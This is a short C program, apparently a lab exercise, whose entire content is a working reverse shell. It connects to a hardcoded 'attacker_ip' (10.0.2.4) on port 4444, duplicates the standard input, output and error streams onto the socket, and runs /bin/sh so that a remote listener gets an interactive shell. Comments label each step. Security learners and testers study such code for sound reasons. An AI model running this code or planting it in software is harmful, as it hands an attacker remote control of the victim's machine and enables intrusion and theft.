#include <stdio.h> 
#include <sys/socket.h> 
#include <netinet/ip.h> 
#include <unistd.h> 

int main(){
	char* attacker_ip = "10.0.2.4" ; 
	unsigned long inet_addr(char *ptr);
	//preparing IP and PORT of the listener : 
	
	struct sockaddr_in Listener_address ; 
	Listener_address.sin_family = AF_INET ; 
	Listener_address.sin_port = htons(4444) ; 
	Listener_address.sin_addr.s_addr = inet_addr(attacker_ip) ; 

	//creating the socket : 

	int socket_d = socket(AF_INET , SOCK_STREAM , 0) ;
       	if(socket_d < 0 ){
		printf("socket creation failed !!") ; 
	};
	
	// Establishing connection with the Listener : 
	
	connect(socket_d ,(struct sockaddr*)&Listener_address , sizeof(Listener_address)) ; 
	for (int i =0 ; i<3 ; i++){
		dup2(socket_d , i ) ; 
	
	};

	// passing the shell to the Listener : 
	
	execve("/bin/sh" , NULL , NULL) ;
 
}	

		

